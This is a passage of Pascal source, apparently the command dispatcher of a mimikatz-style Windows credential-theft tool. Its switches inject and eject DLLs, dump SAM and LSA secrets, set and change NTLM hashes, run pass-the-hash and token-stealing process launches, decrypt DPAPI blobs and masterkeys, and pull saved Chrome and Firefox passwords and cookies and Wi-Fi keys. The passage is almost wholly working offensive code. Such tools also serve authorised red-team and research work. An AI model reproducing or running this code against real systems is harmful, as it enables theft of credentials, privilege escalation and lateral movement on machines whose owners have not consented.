     if TryStrToInt (input,_long ) then pid:=input;
     if pid='' then exit;
     if not TryStrToInt (pid,_long ) then begin log('invalid pid',1);exit;end;
     if binary='' then exit;
     if not FileExists (binary) then exit;
     ProcessHandle:=thandle(-1);
     ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, strtoint(pid));
     if ProcessHandle<>thandle(-1) then
        begin
             try
             if InjectNT_DLL (ProcessHandle,binary) then log('inject ok',1) else log('inject not ok',1) ;
             except
             on e:exception do log(e.message,1);
             end;
        CloseHandle(ProcessHandle);
        end
        else log('OpenProcess failed',1);
     goto fin;
     end;
  p:=pos('/eject',cmdline);  //
  if p>0 then
     begin
     if TryStrToInt (input,_long ) then pid:=input;
     if pid='' then exit;
     if not TryStrToInt (pid,_long ) then begin log('invalid pid',1);exit;end;
     if binary='' then exit;
     binary:= ExtractFileName(binary);
     hmod:=_EnumMod(strtoint(pid),binary);
     if hmod=0 then begin log('module not found',1);exit;end;
     ProcessHandle:=thandle(-1);
     ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, strtoint(pid));
     if ProcessHandle<>thandle(-1) then
        begin
        if EjectRTL_DLL (ProcessHandle,hmod) then log('eject ok',1) else log('eject not ok',1) ;
        CloseHandle(ProcessHandle);
        end
        else log('OpenProcess failed',1);
     goto fin;
     end;
  //********************************************
  p:=pos('/dumpsam',cmdline);
  if p>0 then
     begin
     if dumpsam (lsass_pid ,'') then log('OK',1) else log('NOT OK',1);
     goto fin;
     end;
  p:=pos('/getntlmhash',cmdline);
  if p>0 then
       begin
       if input='' then exit;
       if console_output_type<>FILE_TYPE_PIPE then log('getntlmhash',1);
       log (GenerateNTLMHash (input),1);
       goto fin;
       end;
  p:=pos('/getusers',cmdline);
  if p>0 then
       begin
       QueryUsers (pchar(server),pchar(domain),nil );
       goto fin;
       end;
  p:=pos('/getsids',cmdline);
  if p>0 then
       begin
       if offline
          then getsids('software.sav')
          else QueryUsers (pchar(server),pchar(domain) ,@callback_QuerySID );
       goto fin;
       end;
  p:=pos('/getdomains',cmdline);
  if p>0 then
       begin
       QueryDomains (pchar(server),nil );
       goto fin;
       end;
  p:=pos('/getsid',cmdline);
  if p>0 then
       begin
       GetAccountSid2(widestring(server),widestring(user),mypsid);
       ConvertSidToStringSidA (mypsid,mystringsid);
       log(mystringsid,1);
       goto fin;
       end;
  p:=pos('/setntlm',cmdline);
  if p>0 then
       begin
       if newhash<>'' then newhashbyte :=HexaStringToByte (newhash);
       if newpwd<>'' then newhash:=GenerateNTLMHash (newpwd);
       if SetInfoUser (server,user, HexaStringToByte (newhash))
          then log('Done',1)
          else log('Failed',1);
       end;
  p:=pos('/changentlm',cmdline);
  if p>0 then
       begin
       if oldpwd<>'' then oldhashbyte:=tbyte16(GenerateNTLMHashByte (oldpwd));
       if newpwd<>'' then newhashbyte:=tbyte16(GenerateNTLMHashByte (newpwd));
       if oldhash<>'' then oldhashbyte :=HexaStringToByte (oldhash);
       if newhash<>'' then newhashbyte :=HexaStringToByte (newhash);
       if ChangeNTLM(server,user,oldhashbyte ,newhashbyte)
          then log('Done',1)
          else log('Failed',1);
       end;
  //***************** RUN *****************************
  p:=pos('/pth',cmdline);
  if p>0 then
   begin
   if IsElevated=false
      then writeln('please runas elevated')
      else pth(user,password,domain);
   goto fin;
   end;

  p:=pos('/runastoken',cmdline);
  if p>0 then
     begin
     if copy(winver,1,3)='5.1' then exit;
     if TryStrToInt (input,_long ) then pid:=input;
     if pid='' then exit;
     if not TryStrToInt (pid,_long ) then begin log('invalid pid',1);exit;end;
     if binary='' then binary:=sysdir+'\cmd.Exe';
     if createprocessaspid   (binary,pid)
        then log('OK',1) else log('NOT OK',1);
     goto fin;
     end;
  p:=pos('/runasuser',cmdline);
  if p>0 then
     begin
     if binary='' then binary:=sysdir+'\cmd.Exe';
     if CreateProcessAsLogon (user,password,binary,'')=0
        then log('Done',1)
        else log('Failed',1);
     //WriteLn(Impersonate('l4mpje','Password123')) ;
     //writeln(GetLastError );
     //WriteLn (GetCurrUserName);
     //RevertToSelf ;
     //writeln(GetCurrUserName );
     end;
  p:=pos('/runaschild',cmdline);
  if p>0 then
     begin
     if copy(winver,1,3)='5.1' then exit;
     if TryStrToInt (input,_long ) then pid:=input;
     if pid='' then exit;
     if not TryStrToInt (pid,_long ) then begin log('invalid pid',1);exit;end;
     if binary='' then binary:=sysdir+'\cmd.Exe';
     if CreateProcessOnParentProcess(strtoint(pid),binary)=true
        then log('OK',1) else log('NOT OK',1);
     goto fin;
     end;
  p:=pos('/runas',cmdline);
  if p>0 then
   begin
   runas(binary);
   goto fin;
   end;
  p:=pos('/runts',cmdline);
  if p>0 then
   begin
   if user='' then exit;
   if binary='' then binary:=sysdir+'\cmd.exe';
   //writeln('SeTcbPrivilege:'+BoolToStr ( EnableDebugPriv('SeTcbPrivilege'),true));
   //writeln('SeAssignPrimaryTokenPrivilege:'+BoolToStr ( EnableDebugPriv('SeAssignPrimaryTokenPrivilege'),true));
   writeln(BoolToStr (runTSprocess(strtoint(user),binary),true));
   goto fin;
   end;
  //****************************************************
  p:=pos('/dumpsecret',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     if (offline=false) and (pos('syst',lowercase(GetCurrUserName) )=0) then begin log('run as system, please',1);exit;end;
     if input='*' then
        begin
        if offline
           then MyOrEnumKeys ('security.sav','Policy\secrets')
           else MyRegEnumKeys (HKEY_LOCAL_MACHINE ,'Security\Policy\secrets');
        exit;
        end;
     if getsyskey(syskey)=false then begin log('getsyskey NOT OK',1);exit; end;
     log('syskey:'+ByteToHexaString (syskey));
     //tbal:https://vztekoverflow.com/2018/07/31/tbal-dpapi-backdoor/ & https://twitter.com/gentilkiwi/status/1066830690782797824
     //M$_MSV1_0_TBAL_PRIMARY_{22BE8E5B-58B3-4A87-BA71-41B0ECF3A9EA}
     //
     if dumpsecret(syskey,input,output_,'currval') then
      begin
      if console_output_type<>FILE_TYPE_PIPE then log('CurrVal',1);
      if lowercase(input)='dpapi_system' then
       begin
       if mode='' then
       begin
       log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
       log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
       log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
       end;
       if lowercase(mode)='machine' then log(ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
       if lowercase(mode)='user' then log(ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
       end
       else if pos('_tbal_',lowercase(input))>0 then
            begin
            if ByteToHexaString (@output_ [4],5)='9800000005' then
            begin
            log('ntlm:'+ByteToHexaString (@output_ [16],16),1);
            log('sha1:'+ByteToHexaString (@output_ [48],20),1);
            end
            else //if ByteToHexaString (@output_ [4],5)='9800000005' then
            log('secret:'+ByteToHexaString (@output_ [0],length(output_)),1);
            end  //if pos('_tbal_',lowercase(input))>0 then
       else //if lowercase(input)='dpapi_system' then
       begin
       log('secret:'+ByteToHexaString (@output_ [0],length(output_)),1);
       log('secret:'+BytetoAnsiString (@output_ [0],length(output_)),1);
       end;
      end
      else log('dumpsecret NOT OK for '+input+'\CurrVal' ,1);
      //
      if dumpsecret(syskey,input,output_,'oldval') then
       begin
       if console_output_type<>FILE_TYPE_PIPE then log('OldVal',1);
       if lowercase(input)='dpapi_system' then
        begin
        if mode='' then
        begin
        log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
        log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
        log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
        end;
        //if piping out, then we will only display the currval
        if console_output_type<>FILE_TYPE_PIPE then
           begin
           if lowercase(mode)='machine' then log(ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
           if lowercase(mode)='user' then log(ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
           end;
        end
        else //if lowercase(input)='dpapi_system' then
        begin
        log('secret:'+ByteToHexaString (@output_ [0],length(output_)),1);
        log('secret:'+BytetoAnsiString (@output_ [0],length(output_)),1);
        end;
       end
       else log('dumpsecret NOT OK for '+input+'\OldVal' ,1);
     end;
  p:=pos('/getlsasecret',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     if lsasecret(server,input,output_)=false
        then log('lsasecrets failed',1)
        else
        begin
        if lowercase(input)='dpapi_system' then
         begin
         if mode='' then
                begin
                log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
                log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
                log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
                end; //if mode='' then
                if lowercase(mode)='machine' then log(ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
                if lowercase(mode)='user' then log(ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
                end
         else
         begin
         log('secret:'+ByteToHexaString (@output_ [0],length(output_)),1);
         log('secret:'+BytetoAnsiString  (@output_ [0],length(output_)),1);
         //log('secret:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
         end;
        end;
     goto fin;
     end;
  {
  p:=pos('/dpapi_system',cmdline); //online ONLY, will actually called
  if p>0 then
     begin
     input:='dpapi_system';
     if lsasecret('',input,output_)=false
        then log('lsasecrets failed',1)
        else
        begin
        //CopyMemory( @output_ [0],@output_ [4],length(output_)-4);
        //log(ByteToHexaString (output_),1);
        if mode='' then
          begin
          log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
          log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
          log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
          end; //if mode='' then
        if lowercase(mode)='machine' then log(ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
        if lowercase(mode)='user' then log(ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
        end;
     goto fin;
     end;
  }
  //******************* CRYPT **************************
  p:=pos('/wlansvc',cmdline);
  if p>0 then
     begin
     if (binary='') then exit;
     if parsexml(binary,'keyMaterial',key) then
        begin
        if CryptUnProtectData_(HexaStringToByte2 (key) ,output_)=false
         then
         begin
         log('CryptUnProtectData_ NOT OK',1);
         if HexaStringToFile ('data.blob',HexaStringToByte2 (key)) then log('blob saved to data.blob',1);
         end
         else log('Decrypted:'+BytetoAnsiString (output_),1);
        end
        else log('parsexml NOT OK',1);
     end;
  p:=pos('/cryptunprotectdata',cmdline);
  if p>0 then
     begin
     if (input='') and (binary='') and (FileExists ('data.blob')) then binary:='data.blob';
     if (input='') and (binary='') then exit;
     if binary <>'' then if CryptUnProtectData_(binary,output_)=false
         then log('CryptUnProtectData_ NOT OK',1)
         else
         begin
         if console_output_type<>FILE_TYPE_PIPE then log('CryptUnProtectData_',1);
         if pos('/hexa',cmdline)>0
            then log(BytetohexaString (@output_[0],length(output_)),1)
            else log(BytetoAnsiString (output_),1);
         end;
     if input <>'' then if CryptUnProtectData_(HexaStringToByte2 (input) ,output_)=false
         then log('CryptUnProtectData_ NOT OK',1)
         else
         begin
         if console_output_type<>FILE_TYPE_PIPE then log('CryptUnProtectData_',1);
         if pos('/hexa',cmdline)>0
            then log(BytetohexaString (@output_[0],length(output_)),1)
            else log(BytetoAnsiString (output_),1);
         end;
     end;
  p:=pos('/cryptprotectdata',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     dw:=0;
     if lowercase(mode)='machine' then dw:=4; //CRYPTPROTECT_LOCAL_MACHINE
      if CryptProtectData_(AnsiStringtoByte (input) ,'data.blob',dw)=false
         then log('CryptUnProtectData_ NOT OK',1)
         else log('CryptUnProtectData_ OK - written : data.blob',1);
     end;
  p:=pos('/decodeblob',cmdline);
    if p>0 then
       begin
       if (binary='') and FileExists ('data.blob') then binary:='data.blob';
       if binary='' then exit;
       if not FileExists (binary) then begin writeln('file does not exist');exit;end;
       log('filename:'+extractfilename(binary),1);
       if input='' then
          if decodeblob (binary,nil)=false then log('not ok',1);
        if input<>'' then
           begin
           //pblob:=getmem(sizeof(tdpapi_blob));
           if decodeblob (binary,@myblob)=false then begin log('not ok',1);exit;end;
           input_:=HexaStringToByte2(input);
           log('length(input_):'+inttostr(length(input_)));
           log('**** Unprotecting Blob ****',1);
           if dpapi_unprotect_blob(@myblob,@input_[0] ,length(input_),nil,0,nil,ptr_,dw) then
             begin
             log('dpapi_unprotect_blob ok');
             //SetLength(output_,dw);
             //CopyMemory(@output_[0],ptr_,dw);
             //log('Blob:'+ByteToHexaString (output_),1);
             log('Blob:'+ByteToHexaString (ptr_,dw),1);
             if dw<64 then log('Blob:'+BytetoAnsiString (ptr_,dw),1);
             if dw>=64 then
               begin
               log('**** Decoding Cred Blob ****',1);
               //decodecredblob(@output_[0]);
               decodecredblob(ptr_);
               end;
             end
             else log('dpapi_unprotect_blob not ok',1);
           end;
       goto fin;
       end;
  p:=pos('/decodemk',cmdline);
      if p>0 then
         begin
         if binary='' then exit;
         if not FileExists (binary) then begin writeln('file does not exist');exit;end;
         if (input='') and (password='') then
            if decodemk (binary,nil)=false then
            begin
            log('not ok',1);
            goto fin;
            end;

         //
         if (input<>'') or (password<>'') then
           begin
           if decodemk (binary,@mk)=false then
              begin
              log('not ok',1);
              goto fin;
              end;
           if input<>'' then input_:=HexaStringToByte2(input);
           if password<>'' then
             begin
             if pos('S-1-5',binary)>0 then
               begin
               p:=pos('S-1-5',binary);
               delete(binary,1,p-1);
               input:=copy(binary,1,pos('\',binary)-1);
               input:=ByteToHexaString ( AnsiStringtoByte(input,true))+'0000';
               //log(input);
               input_:=HexaStringToByte2 (input);
               key_:=HexaStringToByte2 (password);
               setlength(output_,crypto_hash_len($00008004));
               zeromemory(@output_[0],length(output_));
               log('Key:'+BytetoHexaString(key_) );
               log('Input:'+BytetoHexaString(Input_) );
               if crypto_hash_hmac ($00008004,@key_[0],length(key_),@input_[0],length(input_),@output_[0],crypto_hash_len($00008004))
                  then
                   begin
                   log('**** gethmac SID+sha1(password) ****',0);
                   log(ByteToHexaString (output_ ),0);
                   end
                   else begin log('crypto_hash_hmac failed',1);goto fin;end;
               //exit;
               setlength(input_,crypto_hash_len($00008004));
               input_:=output_ ;
               end else begin log('cannot detect SID in path',1);goto fin;end; //if pos('S-1-5',binary)>0 then
             end; //if password<>'' then
           log('length(input_):'+inttostr(length(input_)));
           if console_output_type<>FILE_TYPE_PIPE then log('**** Unprotecting MasterKey ****',1);
             ptr_:=nil;
             if dpapi_unprotect_masterkey_with_shaDerivedkey(mk,@input_[0],length(input_),ptr_,dw)
                then
                 begin
                 log('dpapi_unprotect_masterkey_with_shaDerivedkey ok',0);
                 log('dw:'+inttostr(dw));
                 //SetLength(output_,dw);
                 //CopyMemory(@output_[0],ptr_,dw);
                 //log('KEY:'+ByteToHexaString (output_),1);
                 if console_output_type<>FILE_TYPE_PIPE then
                    begin
                    log('KEY:'+ByteToHexaString (ptr_,dw),1);
                    crypto_hash_ (CALG_SHA1,ptr_,dw,output_,crypto_hash_len(CALG_SHA1));
                    log('SHA1:'+ByteToHexaString (output_),1);
                    end;
                 if console_output_type=FILE_TYPE_PIPE then
                    begin
                    crypto_hash_ (CALG_SHA1,ptr_,dw,output_,crypto_hash_len(CALG_SHA1));
                    log(ByteToHexaString (output_),1);
                    end;
                 end
                else log('dpapi_unprotect_masterkey_with_shaDerivedkey not ok',1);
           end; //if input<>'' then
         //
         goto fin;
         end;
      p:=pos('/decodecredhist',cmdline);
          if p>0 then
             begin
             if binary='' then exit;
             if input='' then decodecredhist (binary,nil);
             if input<>'' then
               begin
               input_:=HexaStringToByte2(input);
               decodecredhist (binary,@credhist);
               //log(ByteToHexaString (credhist.entries [0].salt ));
               //log(ByteToHexaString (credhist.entries [0].psecret ));
               setlength(output_,SHA_DIGEST_LENGTH );
               if dpapi_unprotect_credhist_entry_with_shaDerivedkey(credhist.entries [0],@input_[0],length(input_),nil,@output_[0]) then
                 begin
                 log('dpapi_unprotect_credhist_entry_with_shaDerivedkey OK',1);
                 log(ByteToHexaString (output_),1);
                 end;
               end;
             end;
  //************************* HASH ************************************
  p:=pos('/gethash',cmdline);
          if p>0 then
             begin
              if input='' then exit;
              if mode='' then exit;
             dw:=0;
             if mode='SHA512' then dw:=$0000800e;
             if mode='SHA256' then dw:=$0000800c;
             if mode='SHA384' then dw:=$0000800d;
             if mode='SHA1' then dw:=$00008004;
             if mode='MD5' then dw:=$00008003;
             if mode='MD4' then dw:=$00008002;
             if mode='MD2' then dw:=$00008001;

             if crypto_hash_ (dw,pointer(HexaStringToByte2(input)),length(input) div 2,output_,crypto_hash_len(dw))
             then
              begin
              log('gethash',1);
              log(ByteToHexaString(output_),1)
              end
             else log('NOT OK',1);
             goto fin;
             end;
  //************************* HASH HMAC ************************************
  p:=pos('/gethmac',cmdline);
  if p>0 then
  begin
  //log('gethmac',1);
  if input='' then exit;
  if mode='' then exit;
  if key='' then exit;
  dw:=0;
  if mode='SHA512' then dw:=$0000800e;
  if mode='SHA256' then dw:=$0000800c;
  if mode='SHA384' then dw:=$0000800d;
  if mode='SHA1' then dw:=$00008004;
  if mode='MD5' then dw:=$00008003;
  if mode='MD4' then dw:=$00008002;
  if mode='MD2' then dw:=$00008001;

  input_:=HexaStringToByte2(input);

  key_:=HexaStringToByte2(key);

  {
    inputw:=widestring('S-1-5-21-2427513087-2265021005-1965656450-1001');
    //log(inttostr(length(inputw))); //string or widestring will give the same length aka 46
    //log(inttostr((1+length(inputw))*sizeof(wchar))); //94
    setlength(w,(1+length(inputw))*sizeof(wchar));
    //log(inttostr(length(w))); //should be 94
    zeromemory(@w[0],length(w));
    copymemory(@w[0],@inputw[1],length(inputw)*sizeof(wchar));
   }

    setlength(output_,crypto_hash_len(dw));
    zeromemory(@output_[0],length(output_));
    //log(inttostr(length(input_)),0);
  if crypto_hash_hmac (dw,@key_[0],length(key_),@input_[0],length(input_),@output_[0],crypto_hash_len(dw))
     then
      begin
      log('gethmac',1);
      log(ByteToHexaString (output_ ),1);
      end
      else log('not ok',1);
  end;
  //********** CIPHER ****************************************
  //see https://gchq.github.io/CyberChef
  p:=pos('/getcipher',cmdline);
  if p>0 then
  begin
  if input='' then exit;
  if mode='' then exit;
  if key='' then exit;
             dw:=0;
             if pos('RC2',mode)>0 then dw:=CALG_RC2;
             if pos('RC4',mode)>0 then dw:=CALG_RC4;
             if pos('RC5',mode)>0 then dw:=CALG_RC5;
             if pos('DES',mode)>0 then dw:=CALG_DES;
             if pos('3DES',mode)>0 then dw:=CALG_3DES;
             if pos('3DES112',mode)>0 then dw:=CALG_3DES_112;
             if pos('AES',mode)>0 then dw:=CALG_AES;
             if pos('AES128',mode)>0 then dw:=CALG_AES_128;
             if pos('AES256',mode)>0 then dw:=CALG_AES_256;

             dw1:=$00008003; //MD5 default
             if pos('SHA512',mode)>0 then dw1:=$0000800e;
             if pos('SHA256',mode)>0 then dw1:=$0000800c;
             if pos('SHA384',mode)>0 then dw1:=$0000800d;
             if pos('SHA1',mode)>0 then dw1:=$00008004;
             if pos('MD5',mode)>0 then dw1:=$00008003;
             if pos('MD4',mode)>0 then dw1:=$00008002;
             if pos('MD2',mode)>0 then dw1:=$00008001;

             dw2:=2;
             {
             CRYPT_MODE_CBC = 1; // Cipher block chaining
             CRYPT_MODE_ECB = 2; // Electronic code book
             CRYPT_MODE_OFB = 3; // Output feedback mode
             CRYPT_MODE_CFB = 4; // Cipher feedback mode
             CRYPT_MODE_CTS = 5; // Ciphertext stealing mode
             }
             if uppercase(getenv('CRYPT_MODE'))='CBC' then dw2:=1;
             if uppercase(getenv('CRYPT_MODE'))='ECB' then dw2:=2;
             if uppercase(getenv('CRYPT_MODE'))='OFB' then dw2:=3;
             if uppercase(getenv('CRYPT_MODE'))='CFB' then dw2:=4;
             if uppercase(getenv('CRYPT_MODE'))='CTS' then dw2:=5;

  setlength(output_,length(input) div 2);
  zeromemory(@output_[0],length(input) div 2);
  copymemory(@output_[0],pointer(HexaStringToByte2(input)),length(input) div 2);
  //desx, aes and rc5 are not working
  //http://rc4.online-domain-tools.com/ works for rc4, provide the key in hex
  //derive
  //if EnCryptDecrypt (dw,dw1,dw2,AnsiStringToByte(key),output_) then
  //import
  if EnCryptDecrypt (dw,dw1,dw2,HexaStringToByte2(key),output_) then
     begin
     log('getcipher',1);
     log(ByteToHexaString (output_),1);
     log(base64.EncodeStringBase64 (BytetoAnsiString (output_)),1);
     {
     log('******************************');
     EnCryptDecrypt (CALG_RC4 ,'0123456789abcdef',output_,true);
     log(ByteToHexaString (output_),1);
     log(BytetoAnsiString  (output_),1);
     }
     end
     else log('EnCrypt NOT OK',1);

  //copymemory(@input[1],@output_[0],length(input));
  //writeln( string(_ptr^));
  goto fin;
  end;

  //********* BROWSER ****************************************
  p:=pos('/chrome',cmdline);
  if p>0 then
   begin
   if input=''
      then decrypt_chrome(binary)
      else
      begin
      input_:=HexaStringToByte2 (input);
      decrypt_chrome(binary,@input_[0]);
      end;
   goto fin;
   end;
  p:=pos('/ccookies',cmdline);
  if p>0 then
   begin
   uchrome.decrypt_cookies(binary);
   goto fin;
   end;
  p:=pos('/firefox',cmdline);
  if p>0 then
   begin
   decrypt_firefox(binary);
   goto fin;
   end;
  p:=pos('/fcookies',cmdline);
  if p>0 then
   begin
   ufirefox.decrypt_cookies(binary);
   goto fin;
   end;
  //***********************************************************
  fin:
  p:=pos('/wait',cmdline);
  if p>0 then readln;

end.

//todo
{
kuhl_m_dpapi_unprotect_raw_or_blob
kull_m_dpapi_blob_create
}

//todo
//{ "masterkey", "lsasrv!g_MasterKeyCacheList", 0, NULL }, // kuhl_m_sekurlsa_enum_logon_callback_masterkeys },
//{ "masterkey", "dpapisrv!g_MasterKeyCacheList", 0, NULL }, // kuhl_m_sekurlsa_enum_logon_callback_masterkeys },


{
rem Run next command elevated to Admin.
set __COMPAT_LAYER=RunAsAdmin
some command
rem Disable elevation
set __COMPAT_LAYER=
rem continue non elevated
}

{
https://www.nirsoft.net/utils/dpapi_data_decryptor.html
DPAPI decrypted data always begins with the following sequence of bytes, so you can easily detect it:
01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB
0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0
}

//check https://docs.microsoft.com/fr-fr/windows/win32/api/wincrypt/nf-wincrypt-cryptbinarytostringa?redirectedfrom=MSDN
